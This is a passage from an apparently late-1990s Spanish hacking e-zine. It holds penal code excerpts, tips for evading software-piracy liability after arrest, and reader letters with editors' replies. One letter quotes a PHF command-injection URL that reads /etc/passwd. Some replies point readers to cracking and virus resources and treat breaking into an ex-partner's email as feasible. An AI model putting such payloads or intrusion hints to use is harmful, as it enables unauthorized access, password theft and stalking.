	4ß.- Que afecten a bienes de dominio o uso publico o comunal. 
 
	5ß.- Que arruinen al perjudicado o se le coloque en grave situacion 
             economica. 
 
	2.- La misma pena se impondra al que por cualquier medio destruya, 
  altere, inutilice o de cualquier otro modo da§e los datos, programas o 
  documentos electronicos ajenos contenidos en redes, soportes o sistemas 
  informaticos. 
 
  CAPITULO XI  
 
        De los delitos relativos a la propiedad intelectual e industrial, al
  mercado y a los consumidores 
 
        Seccion 1¶.- DE LOS DELITOS RELATIVOS A LA PROPIEDAD INTELECTUAL. 
 
  Articulo 270. 
 
        Sera castigado con la pena de prision de seis meses a dos a§os o de 
  multa de seis a veinticuatro meses quien, con animo de lucro y en perjuicio
  de tercero, reproduzca, plagie, distribuya o comunique publicamente, en
  todo o en parte, una obra literaria, artistica o cientifica, o su
  transformacion, interpretacion o ejecucion artisitica fijada en cualquier
  tipo de soporte o comunicada a traves de cualquier medio, sin la
  autorizacion de los titulares de los correspondientes derechos de propiedad
  intelectual o de sus cesionarios. 

	La misma pena se impondra a quien intencionadamente importe, exporte
  o almacene ejemplares de dichas obras o producciones o ejecuciones sin la 
  referida autorizacion. 

	Sera castigada tambien con la misma pena la fabricacion, puesta en 
  circulacion y tenencia de cualquier medio especificamente destinada a
  facilitar la supresion no autorizada o la neutralizacion de cualquier
  dispositivo tecnico que se haya utilizado para proteger  programas de
  ordenador.
 
  Articulo 278. 
 
        1.- El que, para descubrir un secreto de empresa se apoderare por
  cualquier medio de datos, documentos escritos o electronicos, soportes
  informaticos u otros objetos que se refieran al mismo, o empleare alguno de
  los medios o instrumentos se§alados en el apartado 1 del articulo 197, sera
  castigado con la pena de prision de dos a cuatro a§os y multa de doce a
  veinticuatro meses.
 
        2.- Se impondra la pena de prision de tres a cinco a§os y multa de
  doce a veinticuatro meses si se difundieren, revelaren o cedieren a
  terceros los secretos descubiertos. 
 
        3.- Lo dispuesto en el presente articulo se entendera sin perjuicio de
  las penas que pudieran corresponder por el apoderamiento o destruccion de
  los soportes informaticos. 
 
  CAPITULO III 
 
  Disposicion general 
 
  Articulo 400. 
 
        La fabricacion o tenencia de utiles, materiales , instrumentos,
  sustancias, maquinas, programas de ordenador o aparatos, especificamente
  destinados a la comision de los delitos descritos en los capitulos
  anteriores, se castigaran con la pena se§alada en cada paso para los
  autores.
 
  Articulo 536. 
 
        La autoridad, funcionario publico o agente de estos que, mediando
  causa por delito, interceptare las telecomunicaciones o utilizare
  artificios tecnicos de escuhas, transmision, grabacion o reproduccion del
  sonido, de la imagen o de cualquier otra se§al de comunicacion, con
  violacion de las garantias constitucionales o legales, incurrira en la pena
  de inhabilitacion especial para empleo o cargo publico de dos a seis a§os. 
  Si divulgare o revelare la informacion obtenida, se impondran las penas de 
  inhabilitacion especial, en su mitad superior y, ademas la de multa de seis
  a dieciocho meses.

        Ademas adjunto un texto de shooting que he pillado en la red y que da
  algunos consejos... aunque en principio se refiere a la venta de software
  ilegal, lo he adjuntado ya que su extrapolacion al caso que nos ocupa es
  sencilla y quiza algun dia nos haga falta :o(

        Establece el articulo 520 de la Ley de Enjuiciamiento Criminal. que
  toda persona detenida o presa sera informada, de modo que le sea
  comprensible, y de forma inmediata, de los hechos que se le imputan y las
  razones motivadoras de su privacion de libertad, asi como de los derechos
  que le asisten y especialmente de los siguientes: 

        Derecho a guardar silencio no declarando si no quiere, a no contestar
  alguna o algunas de las preguntas que le formulen, o a manifestar que solo
  declarara ante el Juez. La mejor forma de ejercitar este derecho es no
  decir nada. Asi de sencillo y aunque parezca una perogrullada, desde el
  principio, desde el mismo momento de la detencion, nada, absolutamente nada.

        La policia querra saber donde estan los Cds, la agenda del detenido, a
  quien le ha comprado y vendido este el material, etc. En ese momento, lo
  mejor que puede hacer el detenido es sonreir... y guardar silencio.

        Pese a lo que se le hace creer al ciudadano desde la escuela, el
  detenido no tiene ninguna obligacion de colaborar con la policia, y lo que
  diga solo le puede perjudicar.

        No esta de mas comentar en este punto que cualquier intento de
  sonsacar al detenido con cualquier tipo de coaccion, por suave que parezca,
  debe ser denunciado en la primera declaracion ante el Juez. Es muy posible
  que se informe al detenido que si declara, lo dejaran inmediatamente en
  libertad, y que si no lo hace, detendran a sus amigos o familiares, o
  avisaran a su empresa. Teniendo en cuenta que el detenido en este tipo de
  delitos suele ser joven e inexperto, este tipo de presiones son
  intolerables y deben denunciarse a la primera oportunidad. 

        Derecho a no declarar contra si mismo y a no confesarse culpable.
  Esta intimamente relacionado con el derecho anterior, del que trae causa.

        Derecho a designar Abogado y a solicitar su presencia para que asista
  a las diligencias policiales y judiciales de declaracion e intervenga en
  todo reconocimiento de identidad de que sea objeto. 

        Si el detenido o preso no designara Abogado, se procedera a la
  designacion de oficio. No es imprescindible avisar al abogado de confianza,
  dado que en el supuesto de no declarar, es indiferente que a dicha negativa
  asista un letrado particular, o el de oficio Lo que sucede es que en el caso
  de cambiar posteriormente de abogado, se incrementan los gastos, dado que
  se ha de abonar la minuta al primer designado. Una vez firmada la negativa
  a declarar, el detenido tiene derecho a una entrevista a solas con el
  letrado, para preparar la declaracion ante el Juez, en la que si es
  conveniente asesorarse con alguien que entienda de informatica. 

        Derecho a que se ponga en conocimiento del familiar o persona que
  desee, el hecho de la detencion y el lugar de custodia en que se halle en
  cada momento.

        Los extranjeros tendran derecho a que las circunstancias *anteriores
  se comuniquen a la Oficina Consular de su pais.

        Deben olvidarse las vergÅenzas, ya que esta en juego algo mas
  importante que una bronca familiar. Cuanta mas gente conozca la detencion,
  mejor, asi que la familia debe avisar a todos los amigos que figuren en la
  agenda del detenido, antes de que los avise la policia. Otra razon para
  avisar a la familia es que en caso que la detencion se alargue
  innecesariamente, se puede recurrir al Habeas Corpus, una peticion ante el
  Juez de Guardia para que se ponga inmediatamente al detenido en presencia
  de la autoridad judicial, lo que a veces puede ser necesario, sobre todo si
  se  trata de jovenes de animo debil...

        Derecho a ser asistido gratuitamente por un interprete. 

        Cuando se trate de extranjero que no comprenda o no hable el
  castellano. En este punto el detenido podria ponerse a exigir hablar en el
  idioma propio, lo que es perfectamente inutil cuando no se piensa
  declarar...

        Derecho a ser reconocido por el Medico Forense o su sustituto legal y,
  en su defecto, por el de la Institucion en que se encuentre, o por cualquier
  otro dependiente del Estado o de otras Administraciones Publicas. 

        Aprovechando que no tiene nada mejor que hacer, es conveniente que el 
  detenido insista en que venga el medico. Asi, ademas de pasar mas 
  entretenidas las horas de la detencion, en el supuesto de que venga el
  medico ya hay un primer diagnostico que informa que el detenido entro sin
  lesiones en comisaria. Si dicha situacion cambia, alguien tendra que dar
  explicaciones.

        Una vez ha pasado el miedo de la primera fase de la detencion, se
  podra reflexionar tranquilamente sobre que declarar ante el Juez. Cada caso
  es diferente, y el mas preparado para dise§ar la estrategia de ese momento
  sera el abogado que libremente escoja el detenido. En cualquier caso, no
  esta de mas recordar que para que exista delito por copia ilegal de
  software, esta debe ser con animo de lucro y en perjuicio de tercero. A
  sensu contrario, pueden deducirse de ello dos consejos, a saber: 

        -Nunca debe reconocerse haber cobrado o pagado por una copia

          -Debe proclamarse solemnemente que de no copiar el software,
  tampoco lo hubiesemos comprado, lo que descarta el perjuicio del tercero,
  que no podra en tal caso argumentar que ha perdido una venta. Ya que Bill
  Gates no es altruista, seamoslo nosotros con nuestros semejantes...

  12.- DESPEDIDA

        Bien, creo que el texto ha quedado cumplidito y que cubre los
  aspectos basicos del hacking... espero que os sirva de algo ya que me he
  tenido que pegar una curradilla para escribirlo :)

        Agradecimientos a Zebal (!H) por dejarme reproducir su comparativa de 
  crackeadores de passwords .. thx :)

        Por cierto, este texto esta en formato .txt, en formato .doc, en
  formato .html y en alguno mas :).. asi que si tienes problemas para leer el
  formato que tienes, puedes mailearme para pedirmelo en otro formato.

        Si kieres ponerte en contacto conmigo (Daemon) para cualquier cosa
  (dudas, sugerencias e incluso dinero XDDD) puedes escribir a:

		Daemond@usa.net
		Dillet@usa.net

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

                             ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
                            <  EL LECTOR OPINA  >
                             ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

        Bueno parece que esta seccion esta funcionando, pero haver si para
  el siguiente numero, sois los propios lectores que respondeis a las
  preguntas, asi sera una seccion dinamica.

        Queremos informaros que varios mail's en USA.NET (donde nos enviais
  vuestros mail's) se han perdido por motivos tecnicos. Por eso aquellos
  lectores que nos hayais escrito y no esten aqui puestos y ademas no hayais
  espeficicado expresanemte que no quereis salir en el ezine, nos teneis
  que volver a escribir y os contestaremos en el proximo numero :) Pero no
  os quejeis que hemos includio los mail's llegados a ultima hora a la
  redaccion ;-))

        Tambien deciros que no hay que ponerse nervioso, cuando nos enviais
  un mail, nosotros os enviamos otro diciendo que saldra en el siguiente
  numero o no os enviamos nada ya que tampoco podemos enviar mails a todos
  los que nos envian mail (que somos simples mortales :), o sea que
  tranquilos !!!! que somos humanos nosotros tan bien, con esto queremos
  decir que no nos atosigueis enviamo mail's preguntando cuando sale, el
  ezine sale cuando sale, okis? Bueno dicho lo que teniamos que decir, que
  comienze la seccion.

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Thu, 05 Mar 1998 06:41:29 MDT
  From: martha <m_mondragon@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net
  Subject: mas informacion 

  viejito estuve viendo tu pagina y quede trastornado;
  estuve mirando la informacion de como hackear una web y no entiendo 
  mucho cuando habla de url y la de 
  /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
  me gustaria mucho que me lo explicaras detalladamente. 
  pues a penas estoy empezando a explorar este mundo tan increible como es 
  de los  hackers y te lo prometo que dentro de muy poco tiempo voy a
  estarles ayudando a contribuir en sus paginas 
  mi correo es pacoflaco@xxxxxxxxxxxxxx 

  <------>

  [ Sinceramente, para que estar aqui escribiendo lineas sobre el PHF, cuando
    tienes un arti sobre esto en el numero anterior o sea que te aconsejo
    que te pases por alli y lo leas :)
    Un URL es cualquier direccion en Inet, como por ejemplo:
    http://jjfhackers.home.ml.org
    Okis ? ]
 
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Thu, 05 Mar 1998 06:11:52 MDT
  From: martha <m_mondragon@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net
  Subject: informacion

  viejito me gustaria informacion que tuviera que ver con hackeadores de
  password me gusta todo lo relacionado con hack. 
  mi correo pacoflaco@xxxxxxxxxxxxxx 

  <------>

  [ Te remito otra vez al numero anterior :) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Wed, 04 Mar 1998 09:31:18 MDT
  From: PlaXiuS <plaxius@xxxxxxxxxxxxxx>
  To: jjf_team@usa.net
  Subject: Felicitaciones 

  Bueno Chikos :

  Dejenme felicitarlos por el pedazo de E-Zine que tienen , a pesar de ser 
  cortito , la cantidad de informacion y mas bien dicho la calidad es 
  excelente , e revisado varios E-zine y solo habia encontrado en Raregazz 
  (http://raregazz.islatortuga.com) un E-Zine valiosa, pero hoy encontre 
  uno que realmente satisface mis necesidades ... FELICITACIONES y sigan 
  adelante .. 
  La verdad habia leido un articulo de Nobody en islatortuga , uno que 
  encontre excelente , el hack desde 95 . muy burn articulo ... y me llamo 
  la atencion cuando lo vi por estos lares como colaborador . Bueno seria 
  interesante que publicaran algunos bugs o exploit para Nt Web , ya que 
  es este sistema operativo que esta reinante y sera el que a futuro 
  domine los webs (si es verdad que guindows nt es una mierda ) , pero que 
  le vamos ha hacer , pro lo menos en mi pais la gran mayoria de los 
  server trabajan bajo este sistema operativo ... y el famoso getadmin , 
  esta ampliamente parchado , ademas que solo se puede ejecutar localmente. 

  Bueno me despido y los vuelvo a felicitar por su E-Zine . 

  PlaXiuS . 

  <------>

  [ Pues thx por tus cumplidos y por supuesto que seguiremos trabajando duro
    el ezine para que lo podais disfrutar de verdad :)
    Referente a Nobody que decir... solomante que es uno de nuestros mas
    leales colaboradores con el ezine. Sobre NT algo tenemos pensado asi
    que a lo mejor te damos un sorpesa en algun tiempo y sobre los bug's,
    pues la verdad es que lo hemos pensado pero todavia no estamos seguro
    debido a nuestro escaso tiempo, por lo que si algun lector se quiere
    hacer cargo de una seccion de bug's, pues estaria muy bien!!
    Byes. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Sat, 07 Mar 1998 09:18:17 MDT
  From: "Fernando Di Bernardo" <fdibernardo@xxxxxxxxxxxxxx>
  Subject: password en excel 

  Necesito leer un xls con password, como lo puedo abrir.

  <------>

  [ Pasate por nuestro web en la seccion de crack :) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Mon, 09 Mar 1998 13:27:39 MDT
  From: "Familia Picornell Busquets" <fpicornell@xxxxxxxxxxxxxx>
  Subject: Buenas, gente! 

  Hola!!
  Lo voy a hacer breve:
  Soy un xico de 15 anyos aficionado a la informatica, i ultimamente me
  estoy informando sobre todo esto de hackers, crackers, etc.

  Peroi la verdad es que no pillo nada, o sea primero me respondeis para ver
  si esta direccion es la adequada i luega hablaremos
 
  Hasta luego i gracias!!

  fpicornell@xxxxxxxxxxxxxx

  Pere Picornell i Busquets

  <------>

  [ Pues parece que esta es la direccion correcta, diria yop ;-) y para pillar
    algo sobre el tema, pues lee nuestro ezine que para algo esta. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  From: "Jose M. Guerrero" <jmguerrero@xxxxxxxxxxxxxx> 
  Cc: <conde_vampiro@hotmail.com>
  Subject: Una consulta
  Date: Tue, 10 Mar 1998 12:24:28 +0100

  Hola que tal he encontrado tu web en Internet y he visto que eres un hacker
  y te escribia para pedirte un favor ,te explico conoci una tia por
  casualidad sin buscarlo por internet de Panama y ha estado jugando con mis
  sentimientos nada mas y nada menos que casi un a§o y ahora resulta que se
  esta riendo de mi e intentando jugar conmigo sipcologicamente y me ha hecho
  un da§o que te cagas y mi pregunta es si sabes si seria posible violar su
  cuenta de correo electronico o por lo menos saber cuando se conecta.
  He estado mirando con el programa Finger pero no se si es que no lo se usar
  bien o que la mayoria de cuentas de correo no lo admiten.
  Lo unico que tengo de ella por eso es su direccion e-mail y todo lo que pone
  en las propiedades de algun e-mail suyo.

  Un saludo de un colega de Manresa Barcelona Spain

           Home page
  http://www.freeyellow.com/members/josema
           E-mail:
  jmguerrero@xxxxxxxxxxxxxx

  <------>

  [ Bueno esto es un tema complejo y ya se sabe que las mujeres dan dolor de
    cabeza (y que no se enfaden nuestras lectoras ;), logicamente si que
    puedes violar su correo pero es un delito y esta penado por la
    justicia y tambien puedes saber cuando se conecta. Si tienes su cuenta
    de correo autentica es mas facil si es una anonima pues la cosa se
    complica, ya que si sabes la autentica sabrias su servidor y podrias
    meter un programa que te avisa cuando se conecta, pero logicamente esto
    no es nada facil.
    Sobre el Finger mira el curso de hack IV que viene en este numero, seguro
    que te sera util ;-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Wed, 11 Mar 1998 17:28:02 MDT
  From: Fernando Di Bernardo <fdibernardo@xxxxxxxxxxxxxx>
  To: "'jjf_team@usa.net'"
  Subject: Virus Macros, IP 

  Disculpa si te he tomado como profesor para mi consultas, pero tengo
  interes en recibir o direcciones de inet, codigo fuente de virus macros
  para Office, y si es posible con la explicacion de su funcionamiento. 

  Tambien necesito algun metodo, o programa, para determinar desde que pais, 
  servidor, y algun dato extra, con la direccion IP, que queda grabada en el
  log del server. 

  Gracias 

  <------>

  [ Sobre virus pues pasate por nuestra seccion de virus en nuestro web, que
    seguro que encontaras cosas interesantes.
    Sobre lo de IP si trabajas con linux no tendras problemas para esto y
    ademas en el ezine hay diversa informacion de como hacerlo. Por cierto,
    a quien quieres rastrear ?? }:-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Sat, 14 Mar 1998 01:45:42 MDT
  From: Juan Alonso Costas <juanbert@xxxxxxxxxxxxxx>
  To: jjf_team@usa.net
  Subject: desde Galicia 

  Estimado Hacker, estudio ingieneria y estoy recopilando programas de
  caracter cientifico, enviame si puedes, alguna direcion donde 
  encontrarlos. 

  Gracias de ante mano un saludo. 

  BeRtOnE 

  <------>

  [ Y que tenemos que ver nosotros con la distribucion de soft ???
    y thx por la foto X pero pasamos de sobornos :)
    Si quieres soft cientifico hay muchos sitios donde pillar solo hay que
    moverse un poco !!! ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Fri, 13 Mar 1998 21:50:51 -0500
  From: LEONARDO SANCHEZ <al28933@xxxxxxxxxxxxxx> 
  To: conde_vampiro@hotmail.com
  Subject: Novato

  Conde Vampiro, soy nuevo en esto del hacking, por esto necesito toda la
  informacion posible o algo en lo cual apoyarme.

  Agradezco cualquier ayuda proporcionada
 
  Zeus(hardbody@xxxxxxxxxxxxxx)

  <------>

  [ Informacion pues ya sabes lee nuestro ezine y navega por nuestro web, que
    seguro que pillas muchas cosas ;-) Byes ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  De: ib309481@xxxxxxxxxxxxxx
  A: jjf_team@hotmail.com
  Asunto: J.J.Hackers Team
  Fecha: lunes 1 de enero de 1990 0:49

  En primer lugar quiero felicitaros por la revista, porque °es c....!.
  Tambien a ser posible que hablaseis sobre Linux, porque tengo dudas,  ®es
  imprescindible para hackear? y no se si cogerlo.
  A ser posible quisiera un truco para llamar gratis, o menos dinero......,
  cosas asi. La cabina a la que me refiero es una cabina digital de
  Telefonica azul, con posibilidad de tarjeta y de monedas. Y por ultimo,
  ®como consigo una cuenta shell?, ni en #Hackers, ni en #Shell, he dado con
  la respuesta.
  Saludos a "Conde_Vampiro", que salio en la revista RED, hablando sobre
  hackers y la revista..........

  Adios y gracias "XSepHack"

  <------>

  [ Bueno pues thx a ti por tus cumplidos y ya veras mas cosas nuestras en la
    revista EN LA RED ;-), sobre linux lo mas seguro es que demos un curso
    o sea que problema resuelto y sobre si es necesario para hackear, yo
    diria que sip ya que muchos servidores utilizan esos s.o., ademas
    linux te trae muchas herramientas que te seran utiles que los otros
    s.o. (sistemas operativos) no traen.
    Lo de phones esta chungo, ya se sabe que timofonica es una jodia, pero
    ya pillaras algun truco en el ezine y en algunos web's sobre el tema.
    Lo de shell siempre es dificil al principio ya que sino consigues que
    alguien te pase una para empezar tendras que hackear una tu. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Sun, 15 Mar 1998 03:12:46 MDT
  From: "Jose M. Guerrero" <jmguerrero@xxxxxxxxxxxxxx>
  To: Subject: 

  Cuando sale el numero 4 de e-zine?
  Home page 
  http://www.freeyellow.com/members/josema 
  E-mail: 
  jmguerrero@xxxxxxxxxxxxxx 

  <------>

  [ Ya lo estas leyendo ;-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Mon, 16 Mar 1998 20:56:31 MDT
  From: "Jose M. Guerrero" <jmguerrero@xxxxxxxxxxxxxx>
  Subject: RE: []

  Yo fuie quien envio el siguiente e-mail ,pagaria 5000 pst al que me diera
  la salucion para recivir lo emails que ella recive o envia de esa tia que
  me jodio tanto o a menos saber cuando esta conectada o dende 

  Hola que tal he encontrado tu web en Internet y he visto que eres un hacker 
  y te escribia para pedirte un favor ,te explico conoci una tia por 
  casualidad sin buscarlo por internet de Panama y ha estado jugando con mis 
  sentimientos nada mas y nada menos que casi un a§o y ahora resulta que se 
  esta riendo de mi e intentando jugar conmigo sipcologicamente y me ha hecho 
  un da§o que te cagas y mi pregunta es si sabes si seria posible violar su 
  cuenta de correo electronico y ver su correspondencia o por lo menos saber 
  cuando se conecta. 
  He estado mirando con el programa Finger y el San Spam pero no se si es 
  que no lo se usar 
  bien o que la mayoria de cuentas de correo no lo admiten. 
  Lo unico que tengo de ella por eso es su direccion e-mail y todo lo que pone 
  en las propiedades de algun e-mail suyo. 
  Un saludo de un colega de Manresa Barcelona Spain 
  Home page 
  http://www.freeyellow.com/members/josema 
  E-mail: 
  jmguerrero@xxxxxxxxxxxxxx 

  <------>

  [ Tranquilo !!, ya te hemos dado nuestra contestacion mas arriba ;-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Wed, 18 Mar 1998 09:47:09 MDT
  From: <kawa.saki@xxxxxxxxxxxxxx>
  Subject: Hola 

  Hola,
  Soy un poco Newbie, donde y como empiezo, que leo, etc, 
  Dany, 
  Gracias por adelantado 

  CodeBracker en IRC

  <------>

  [ Pues logicamnete este ezine, que seguro que te sera de gran ayuda, aunque
    por descontado, pasate por nuestro web. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Subject: joder
  To: jjf_team@hotmail.com
  Date: Mon, 23 Mar 1998 10:40:46 MET
  From: 444525@xxxxxxxxxxxxxx 

  soy yo oooootra vez..rrush
  ke se me olvidaba una kosilla.Ke si sabeis alguna otra forma de entrar
  debido a la mala konfiguaricon del ftp.
  vale?
  pos adiox y thx 

  <------>

  [ Curioso, la verdad, ya te respondimos en el numero 3, pero por lo visto
    no lo has leido. Te diremos lo mismo que antes, has intentado usar el
    Kermit ?, tambien puedes enviarte un mail a esa cuenta con el fichero
    adjunto y ya esta. En realidad es muy simple :)
    Por cierto, hemos cambiado de Buzon!!!!! ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Thu, 26 Mar 1998 16:40:19 MDT
  From: martha <m_mondragon@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net
  Subject: sangre 


  <------>

  [ Y esto ???? un mail vacio, como estamos!! ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  From: "Familia Picornell Busquets" <fpicornell@xxxxxxxxxxxxxx> 
  To: <jjf_team@hotmail.com> 
  Subject: Ayuda, por favor! 
  Date: Tue, 24 Mar 1998 02:32:42 +0100 
 
  Hola, gente! 
  Soy un newbie que necesito ayuda para poder hacer algo, para aprender, 
  ya que todo lo que encuentro son: o Hackers que no comparten sus  
  conocimientos, o documentos ilegibles, o con tecnicismos que no  
  pillo, etc... 

  A ver si podeis perder un poco de tiempo indicandome donde puedo ir, 
  con quien puedo hablar, o mandarme algun arxivo (podeis confiar  
  conmigo, por favor no me puteeis como ya me han hecho algunas veces. yo 
  confio en vosotros, al menos...) 

  Os agradeceria muchisimo vuestra ayuda.
  Por cierto, puede que la direccion no funcione, entonces responded 
  directamente al missage i quiza funcione 

  fpicornell@xxxxxxxxxxxxxx 
 
  Gracias! 
 
  the Sardaukar 
  
  <------>

  [ Nosotros respondemos por aqui :) y si lo que buscas es info, pues lee
    este ezine que esta creado para que os podais meter en el mundo
    underground sin ningun problema, ya que todo esta bien explicado o eso
    pensamos, lo de enviar ficheros y hablar con gente en eso no podemos
    ayudarte, siempre te puedes poner en contacto con los autores de los
    articulos y que conste que nosotros no puteamos a nadie ;-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Tue, 31 Mar 1998 20:46:29 MDT
  From: Victor Pena Huerta <vphuerta@xxxxxxxxxxxxxx>
  To: jjf_team@usa.net
  Subject: hola 

  me gustaria ser hacker me podrian ensellar mi nick es ssayan3

  <------>

  [ Hombre, no vamos dando clases privadas, como comprenderas, pero para eso
    esta nuestro/vuestro ezine :), para que podais aprender el arte del
    hacking, pero en realidad el hacking es la curiosidad y ganas de
    aprender. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  From: "Alberto Castro" <albertocr@xxxxxxxxxxxxxx> 
  To: jjf_team@hotmail.com
  Subject: cuenta shell
  Date: Sun, 29 Mar 1998 18:45:31 PST

  Hola muchachos, soy nuevo en este mundo,
  Me parece muy interesante su revista, sigan adelante.
 
  Me gustaria tener la cuenta shell en:
  http://www2.seeder.net.tw/tpm/

  Gracais por todo.

                          Dragonfly

  <------>

  [ Pues thx por tus cumplidos y claro que seguiremos en esta linea o incluso
    superarnos ;-)
    Pero no entendemos que quieres decir con lo de la cuenta shell ??, hemos
    visto que todo esta en Chino. Acaso entiendes chino ?? ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Tue, 31 Mar 1998 23:52:20 MDT
  From: plaxius <plaxius.com@xxxxxxxxxxxxxx>
  To: jjf_team@usa.net
  Subject: muy guena 

  Holap chikos ..

